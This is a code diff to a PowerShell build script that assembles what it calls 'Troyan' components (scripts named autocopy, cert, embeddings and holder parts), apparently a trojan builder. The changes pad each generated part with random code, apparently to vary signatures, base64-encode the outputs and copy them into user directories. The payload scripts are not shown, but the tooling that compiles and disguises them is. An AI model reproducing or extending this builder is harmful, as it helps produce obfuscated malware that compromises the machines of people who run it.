@@ -288,7 +288,6 @@ function Make-Template-Holder {
     }
 
     $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_$target.ps1")
-    return $template
 }
 
 function Make-Template-Embeddings { 
@@ -472,11 +471,10 @@ function BuldScriptParts{
        function get{
         param ([string]$name)
       
-        $fn =Join-Path -Path $server.troyanScriptDir -ChildPath $name
-        $data=""
-        #$data += (Generate-RandomCode)
-        $data += GetUtfNoBom -file $fn
-        return  "`n`n" + "# $name" + "`n`n" + $data
+            $fn =Join-Path -Path $server.troyanScriptDir -ChildPath $name
+            $contentBytes = [System.IO.File]::ReadAllBytes($fn)
+            $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)
+            return  "`n`n" + $contentWithoutBom +  "`n`n"
        }
 
        $pref = '
@@ -498,7 +496,8 @@ function BuldScriptParts{
 
     $utils = get -name "utils.ps1"
     $consts_body = get -name "consts_body.ps1"
-    $consts_holder = get -name "consts_holder_parts.ps1"
+    $consts_holder = get -name "consts_holder.ps1"
+    $consts_holder_parts = get -name "consts_holder_parts.ps1"
     $consts_embeddings = get -name "consts_embeddings.ps1"
     $consts_cert = get -name "consts_cert.ps1"
 
@@ -506,16 +505,35 @@ function BuldScriptParts{
 
     foreach ($file in $files) {
         $fn = $file.Name
-        $fileContent = $pref
+
+        $fileContent =""
         $fileContent += get -name $fn
-        $fileContent = $fileContent -replace '. ./utils.ps1', $utils
-        $fileContent = $fileContent -replace '. ./consts_body.ps1', $consts_body
-        $fileContent = $fileContent -replace '. ./consts_holder.ps1', $consts_holder
-        $fileContent = $fileContent -replace '. ./consts_embeddings.ps1', $consts_embeddings
-        $fileContent = $fileContent -replace '. ./consts_cert.ps1', $consts_cert
+        $fileContent = $fileContent -replace "\.\s+\./[^/]+\.ps1", "`n`n"
         $fileContent += $suff    
         $outFile = Join-Path -Path $server.troyanOutputParts -ChildPath $fn
+        if ($fn -eq "embeddings.ps1")
+        {
+            $fileContent = $utils + $consts_holder_parts +  $consts_embeddings +  $fileContent
+        }
+        elseif ($fn -eq "autocopy.ps1")
+        {
+            $fileContent = $utils + $consts_holder +  $consts_cert +  $fileContent
+        }
+        elseif ($fn -eq "cert.ps1")
+        {
+            $fileContent = $utils + $consts_holder_parts +  $consts_cert +  $fileContent
+        }
+        else 
+        {
+            $fileContent = $utils + $consts_holder_parts + $fileContent
+        }
+        $fileContent = $pref + (Generate-RandomCode) +  $fileContent + $suff
+
         Utf8NoBom -data $fileContent -file $outFile
+
+        $encoded = Encode-FileToBase64 -inFile $outFile
+        $outFile = Join-Path -Path $server.troyanOutputParts -ChildPath ([System.IO.Path]::ChangeExtension($fn, ".txt"))
+        Utf8NoBom -data $encoded -file $outFile
     }
 }
 
@@ -524,5 +542,14 @@ Make-Template-Holder -target "holder_parts" -withBody $false -withSelf $false -s
 BuldScriptParts
 Copy-Item -Path (Join-Path -Path $server.troyanOutputParts -ChildPath "holder_parts.ps1") -Destination $server.troyanHolderParts -Force
 Copy-Item -Path (Join-Path -Path $server.troyanOutputParts -ChildPath "holder_parts.ps1") -Destination $server.userTroyanHolderParts -Force
+$outPath = $server.userTroyanParts
+if (-not [string]::IsNullOrEmpty($outPath)) 
+{
+    Remove-Item -Path $outPath\* -Recurse -Force
+    if (-not (Test-Path $outPath )) {
+        New-Item -Path $outPath  -ItemType Directory
+    }
+}
+Copy-Item -Path $server.troyanOutputParts -Destination $server.userDataDir -Force -Recurse
 
 Write-Host "Troyan Compile complete"
